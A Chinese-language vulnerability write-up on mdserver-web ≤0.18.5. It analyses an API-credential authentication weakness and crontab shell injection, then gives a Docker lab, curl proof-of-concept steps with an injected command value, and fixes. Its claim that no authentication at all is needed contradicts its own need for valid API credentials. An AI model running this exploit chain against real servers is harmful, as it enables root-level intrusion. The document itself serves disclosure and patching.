# mdserver-web ≤0.18.5 认证绕过 + 远程代码执行（RCE）漏洞分析

---

## 漏洞简介

**mdserver-web** 是一款基于 Python/Flask 开发的轻量级 Linux 服务器管理面板，提供网站管理、数据库管理、计划任务（Crontab）调度、文件管理、防火墙配置等功能，支持 Debian/Ubuntu/CentOS/Fedora 等主流 Linux 发行版，项目托管于 GitHub（[midoks/mdserver-web](https://github.com/midoks/mdserver-web)）。

在 **≤0.18.5** 版本中，面板认证中间件 `panel_login_required` 存在两处安全缺陷：

1. **认证绕过（Auth Bypass）**：当面板 API 功能开启时，攻击者只需在 HTTP 请求头中携带有效的 `App-Id` / `App-Secret` 对，即可完全绕过 Session 登录校验，直接访问所有受保护接口；且 IP 白名单配置虽在 UI 层要求填写，却从未在鉴权逻辑中实际生效。

2. **Shell 注入 → 远程代码执行（RCE）**：计划任务模块的 `toUrl` 类型将 `url_address` 参数未经过滤直接拼接到 Shell 命令字符串中，攻击者可借此注入任意 Shell 指令，在服务器上实现无限制代码执行。

两个漏洞组合利用：**无需任何认证，即可在目标服务器上执行任意命令**。

---

## 漏洞分析

### 一、漏洞发现思路

**（1）关注项目更新日志与 PR 差异**

通过审查 GitHub 仓库的 Pull Request 记录与版本 changelog，注意到 `web/admin/user_login_check.py` 和 `web/utils/crontab.py` 在近期版本中被修改。进一步对比前后差异，发现认证逻辑存在明显的逻辑缺陷，由此锁定漏洞位置。

**（2）源码审计——认证中间件**

所有受保护路由（Dashboard、Crontab、Files、Firewall 等）均通过 `@panel_login_required` 装饰器进行认证校验，该装饰器定义于：

```
web/admin/user_login_check.py
```

**（3）源码审计——计划任务模块**

`web/utils/crontab.py` 中的 `getShell()` 方法负责为计划任务生成 Shell 脚本，`toUrl` 类型直接将用户输入拼接到 `curl` 命令。

---

### 二、漏洞一：认证绕过（Auth Bypass）

#### 漏洞代码（`web/admin/user_login_check.py`）

```python
def panel_login_required(func):

    @wraps(func)
    def wrapper(*args, **kwargs):
        # 面板API调用检查
        app_id = request.headers.get('App-Id','')
        app_secret = request.headers.get('App-Secret','')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open":True})  # ← ①
            if panel_api['open']:
                return_code = 404
                info = thisdb.getAppByAppId(app_id)
                if app_secret != info['app_secret']:  # ← ②
                    return Response(status=int(return_code))
                return func(*args, **kwargs)  # ← ③ 认证通过，跳过 Session 检查

        if not isLogined():
            unauthorized_status = thisdb.getOption('unauthorized_status')
            if unauthorized_status == '0':
                return render_template('default/path.html')
            return Response(status=int(unauthorized_status))

        return func(*args, **kwargs)
    return wrapper
```

#### 逐行分析

| 标记 | 位置 | 问题 |
|------|------|------|
| ① | `default={"open":True}` | **危险默认值**：若数据库中 `panel_api` 选项被删除或未初始化，则该选项默认为开启状态（`open: True`），导致任意持有 API 凭据的请求均可绕过认证 |
| ② | `info['app_secret']` | **空指针异常**：若 `app_id` 在数据库中不存在，`getAppByAppId()` 返回 `None`，则 `None['app_secret']` 抛出 `TypeError`，产生 500 错误而非正常拒绝 |
| ③ | `return func(*args, **kwargs)` | **完全绕过 Session**：凭借有效 API 凭据的请求，直接执行目标函数，整个 Session 认证逻辑被跳过 |

#### 缺失的 IP 白名单校验

在面板设置中添加 API 应用时，UI 层强制要求填写 `limit_addr`（IP 白名单）：

```python
# web/admin/setting/app.py
limit_addr = request.form.get('limit_addr', '').strip()
if limit_addr == '':
    return mw.returnData(False, 'IP限制不能为空!')
rid = thisdb.addApp(app_id, app_secret, limit_addr)
```

`white_list` 字段也被存入数据库，但 **`panel_login_required` 中从未读取 `white_list` 字段**，导致 IP 白名单形同虚设——攻击者可从任意 IP 使用合法凭据访问面板。

---

### 二、漏洞二：Shell 注入 → 远程代码执行（`web/utils/crontab.py`）

#### 漏洞代码

```python
def getShell(self, param):
    # ...
    if stype == 'toUrl':
        shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"
    # ...
    file = cron_path + '/' + cron_name
    mw.writeFile(file, self.checkScript(shell))
    mw.execShell('chmod 750 ' + file)
    return cron_name
```

#### 问题分析

`url_address` 直接拼接进 Shell 脚本，**未做任何转义或过滤**（`checkScript` 仅屏蔽 `shutdown`、`mkfs` 等极少数关键词，无法防御 Shell 注入）：

```python
# checkScript 仅过滤以下少数词汇，形如白名单式过滤，极易绕过
def checkScript(self, shell):
    keys = ['shutdown', 'init 0', 'mkfs', 'passwd',
            'chpasswd', '--stdin', 'mkfs.ext', 'mke2fs']
    for k in keys:
        shell = shell.replace(k, '[***]')
    return shell
```

构造恶意 `url_address`：

```
'; id > /tmp/pwned.txt; echo '
```

生成的 Shell 脚本片段为：

```bash
curl -sS --connect-timeout 10 -m 60 ''; id > /tmp/pwned.txt; echo ''
```

通过 `/crontab/start_task` 接口立即触发执行，即可在目标服务器上执行任意命令。

---

### 三、组合利用链

```
攻击者
  │
  ├─[1]─ 获取/猜解有效 app_id + app_secret
  │       （或管理员已开启面板 API 且凭据泄露）
  │
  ├─[2]─ POST /crontab/add
  │       Header: App-Id: <app_id>
  │       Header: App-Secret: <app_secret>
  │       Body:   stype=toUrl
  │               url_address='; <COMMAND>; echo '
  │               name=pwn&type=day&...
  │
  ├─[3]─ POST /crontab/start_task
  │       Header: App-Id / App-Secret
  │       Body:   id=<cron_id>
  │
  └─[RCE]─ 目标服务器执行任意命令 ✅
```

---

## 环境搭建

> **优化说明**：官方 `docker/Dockerfile` 会编译安装 PHP 74、OpenResty、MySQL 5.6、phpMyAdmin，耗时约 30-60 分钟。本复现环境仅启动 Flask Web 面板（SQLite 数据库），**无需任何编译，构建时间约 2-5 分钟**。

### 前置条件

| 工具 | 版本要求 |
|------|---------|
| Docker | ≥ 20.10 |
| Docker Compose | ≥ 2.0（`docker compose` 命令） |
| 可用端口 | 7200 |

### 目录结构

```
docker/vuln/
├── Dockerfile          # 基于 python:3.11-slim，无编译依赖
├── docker-compose.yml  # 容器编排
├── entrypoint.sh       # 容器启动脚本（前台 gunicorn）
├── start.sh            # 一键启动
├── stop.sh             # 停止（保留数据）
├── clean.sh            # 完全清理（容器+镜像+网络+卷）
└── README.md           # 本文档
```

### 快速启动

```bash
# 克隆仓库（或使用已克隆版本）
git clone https://github.com/Mr-xn/mdserver-web.git
cd mdserver-web

# 赋予脚本执行权限
chmod +x docker/vuln/start.sh docker/vuln/stop.sh docker/vuln/clean.sh

# 一键启动漏洞环境
bash docker/vuln/start.sh
```

启动成功后终端输出示例：

```
================================================================
  ✅  环境已就绪
================================================================
  面板地址  : http://127.0.0.1:7200/AbCd1234
  用户名    : xk3mfp2a
  密码      : 9rqztwbn
  ℹ️  容器名  : mdserver-web-vuln
  ℹ️  查看日志: docker logs -f mdserver-web-vuln
================================================================
```

### 管理命令速查

```bash
# 启动
bash docker/vuln/start.sh

# 停止（保留数据卷，可再次 start 恢复）
bash docker/vuln/stop.sh

# 完全清理（删除容器 + 镜像 + 网络 + 所有挂载卷）
bash docker/vuln/clean.sh

# 手动进入容器
docker exec -it mdserver-web-vuln bash

# 实时查看面板日志
docker logs -f mdserver-web-vuln

# 查看初始密码
docker exec mdserver-web-vuln cat /www/server/mdserver-web/data/default.pl
```

### 手动开启面板 API（漏洞触发前置条件）

登录面板后，进入 **设置 → API 管理**：

1. 点击"开启 API"
2. 添加应用：填写任意 `App-Id`、`App-Secret`，IP 限制填 `0.0.0.0`（注意：实际上 IP 限制不生效）
3. 记录 `App-Id` 和 `App-Secret`

或直接在容器内通过 Python 脚本初始化：

```bash
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
import thisdb, json

# 开启 API
thisdb.setOption('panel_api', json.dumps({'open': True}))
# 添加应用凭据
thisdb.addApp('test_app_id', 'test_app_secret', '0.0.0.0')
print("[+] 面板 API 已开启，凭据：test_app_id / test_app_secret")
EOF
```

---

## 漏洞复现

### Step 1：验证认证绕过

未登录状态下，正常访问受保护接口应被拦截（返回 `path.html` 或 4xx）：

```bash
# 未认证请求 → 被拦截
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -d "p=1&limit=10"
```

携带 API 凭据后，认证绕过成功：

```bash
# 认证绕过 → 直接获取计划任务列表
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
```

预期输出：返回 JSON 格式的计划任务列表（而非登录页），表明认证绕过成功。

### Step 2：添加恶意计划任务（Shell 注入）

通过认证绕过接口，添加一条 `toUrl` 类型的恶意计划任务：

```bash
curl -s -X POST http://127.0.0.1:7200/crontab/add \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "name=pwn_test" \
  -d "type=day" \
  -d "where1=" \
  -d "hour=0" \
  -d "minute=0" \
  -d "save=0" \
  -d "backup_to=localhost" \
  -d "stype=toUrl" \
  -d "sname=" \
  -d "sbody=" \
  --data-urlencode "url_address='; id > /tmp/pwned.txt; echo '"
```

预期响应：`{"status": true, "msg": "添加成功"}`

### Step 3：立即触发执行

查询刚添加任务的 ID，然后触发执行：

```bash
# 获取任务 ID
CRON_ID=$(curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10" | python3 -c "
import json,sys
data=json.load(sys.stdin)
tasks=data.get('data',{}).get('list',[])
for t in tasks:
    if t.get('name')=='pwn_test':
        print(t['id']); break
")

echo "[*] 计划任务 ID: ${CRON_ID}"

# 触发执行
curl -s -X POST http://127.0.0.1:7200/crontab/start_task \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "id=${CRON_ID}"
```

### Step 4：验证命令执行结果

```bash
# 在容器内验证
docker exec mdserver-web-vuln cat /tmp/pwned.txt
```

预期输出（`id` 命令执行结果）：

```
uid=0(root) gid=0(root) groups=0(root)
```

🎉 **远程代码执行成功！**

### Step 5：验证 IP 白名单不生效

即使将 `white_list` 设置为仅允许某个特定 IP，从任意 IP 发起请求依然可以访问：

```bash
# 在容器内修改白名单为仅允许 192.168.99.99
docker exec -it mdserver-web-vuln python3 - << 'EOF'
import sys, os
os.chdir('/www/server/mdserver-web/web')
sys.path.insert(0, '/www/server/mdserver-web/web')
import core.mw as mw
mw.M('app').where("app_id=?", ('test_app_id',)).update({'white_list': '192.168.99.99'})
print("[+] 白名单已设置为 192.168.99.99")
EOF

# 从本机（非 192.168.99.99）依然可访问 → 白名单无效
curl -s -X POST http://127.0.0.1:7200/crontab/list \
  -H "App-Id: test_app_id" \
  -H "App-Secret: test_app_secret" \
  -d "p=1&limit=10"
```

预期：仍然返回任务列表，IP 白名单限制完全无效。

---

## 漏洞修复

### 修复一：补全 IP 白名单校验（`web/admin/user_login_check.py`）

```python
def panel_login_required(func):
    @wraps(func)
    def wrapper(*args, **kwargs):
        app_id = request.headers.get('App-Id', '')
        app_secret = request.headers.get('App-Secret', '')
        if app_id != '' and app_secret != '':
            panel_api = thisdb.getOptionByJson('panel_api', default={"open": False})  # ← 修复①：危险默认值改为 False
            if panel_api['open']:
                info = thisdb.getAppByAppId(app_id)
                if info is None:                               # ← 修复②：增加空指针检查
                    return Response(status=404)
                if app_secret != info['app_secret']:
                    return Response(status=404)
                # ← 修复③：强制校验 IP 白名单
                white_list = info.get('white_list', '')
                if white_list and white_list != '0.0.0.0':
                    client_ip = mw.getClientIp()
                    allowed_ips = [ip.strip() for ip in white_list.split(',')]
                    if client_ip not in allowed_ips:
                        return Response(status=403)
                return func(*args, **kwargs)

        if not isLogined():
            # ... 原有逻辑不变
        return func(*args, **kwargs)
    return wrapper
```

### 修复二：Shell 注入修复（`web/utils/crontab.py`）

```python
import shlex  # ← 引入 shlex

if stype == 'toUrl':
    # 修复前（漏洞）：
    # shell = head + "curl -sS --connect-timeout 10 -m 60 '" + param['url_address'] + "'"

    # 修复后：使用 shlex.quote 进行 Shell 转义
    safe_url = shlex.quote(param['url_address'])
    shell = head + "curl -sS --connect-timeout 10 -m 60 " + safe_url
```

### 修复效果对比

| 攻击向量 | 修复前 | 修复后 |
|---------|--------|--------|
| 无 Session 携带 API Key 访问 | ✅ 认证绕过成功 | ❌ 正常鉴权 |
| 非白名单 IP 使用 API Key | ✅ 访问成功 | ❌ 403 拒绝 |
| app_id 不存在时的空指针 | ✅ 500 错误 | ❌ 404 拒绝 |
| toUrl 注入 Shell 命令 | ✅ RCE 成功 | ❌ 被转义 |

---

## 漏洞处置

### 临时缓解措施（治标）

在官方补丁发布前，**管理员可采取以下措施降低风险**：

1. **关闭面板 API 功能**（最直接有效）：
   - 进入面板 **设置 → API 管理** → 关闭 API
   - 或在容器内执行：
     ```bash
     docker exec -it mdserver-web-vuln python3 - << 'EOF'
     import sys, os, json
     os.chdir('/www/server/mdserver-web/web')
     sys.path.insert(0, '/www/server/mdserver-web/web')
     import thisdb
     thisdb.setOption('panel_api', json.dumps({'open': False}))
     print("[+] 面板 API 已关闭")
     EOF
     ```

2. **防火墙限制**：仅允许可信 IP 访问面板端口（7200）：
   ```bash
   ufw allow from <trusted_ip> to any port 7200
   ufw deny 7200
   ```

3. **删除所有 API 应用凭据**：即使 API 开启，无凭据也无法利用

4. **启用 Basic Auth**：在面板 **设置 → 安全设置** 中开启 HTTP Basic Auth，添加一层额外认证

### 永久修复（治本）

**升级至官方修复版本**：

```bash
# 停止并重建环境（拉取最新代码）
bash docker/vuln/clean.sh

# 拉取修复版本后重新构建
git pull origin main
bash docker/vuln/start.sh
```

### 受影响版本

| 版本范围 | 状态 |
|---------|------|
| ≤ 0.18.5 | ⚠️ 受影响 |
| > 0.18.5 | 待官方确认 |

---

## 参考链接

- 项目仓库：[https://github.com/midoks/mdserver-web](https://github.com/midoks/mdserver-web)
- 漏洞分析仓库（含 PoC）：[https://github.com/Mr-xn/mdserver-web](https://github.com/Mr-xn/mdserver-web)
- 受影响代码文件：
  - `web/admin/user_login_check.py`（认证绕过）
  - `web/utils/crontab.py`（Shell 注入 RCE）
  - `web/admin/setting/app.py`（API 管理接口）
- Python `shlex` 模块文档：[https://docs.python.org/3/library/shlex.html](https://docs.python.org/3/library/shlex.html)
- OWASP：[Authentication Bypass](https://owasp.org/www-community/attacks/Authentication_Bypass)
- OWASP：[OS Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- CWE-306：[Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- CWE-78：[Improper Neutralization of Special Elements in OS Command](https://cwe.mitre.org/data/definitions/78.html)
